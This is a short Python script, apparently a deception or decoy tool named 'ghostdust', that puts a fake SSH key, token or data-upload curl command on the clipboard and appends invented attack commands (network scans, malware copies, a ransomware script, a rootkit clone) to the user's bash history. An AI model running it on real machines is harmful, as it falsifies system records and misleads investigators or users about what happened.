import os
import random
import time
from pathlib import Path

# Define fake clipboard entries
FAKE_CLIPBOARDS = [
    "-----BEGIN OPENSSH PRIVATE KEY-----\nMIIEpQIBAAKCAQEAr...\n-----END OPENSSH PRIVATE KEY-----",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "curl -X POST http://leaky-api.internal/upload -d @sensitive.zip",
]

# Define fake shell history commands
FAKE_HISTORY = [
    "nmap -sS 10.0.0.0/24",
    "scp malware.py user@192.168.1.5:/tmp/",
    "python3 recon_tool.py --stealth",
    "vim ransomware_deploy.py",
    "git clone https://github.com/evilcorp/rootkit.git",
]

def inject_clipboard():
    clipboard = random.choice(FAKE_CLIPBOARDS)
    os.system(f"echo '{clipboard}' | xclip -selection clipboard")
    print("[ghostdust] Fake clipboard injected.")

def inject_history():
    history_file = os.path.expanduser("~/.bash_history")
    with open(history_file, "a") as f:
        f.write(random.choice(FAKE_HISTORY) + "\n")
    print("[ghostdust] Fake command history entry added.")

def main():
    inject_clipboard()
    inject_history()

if __name__ == "__main__":
    main()
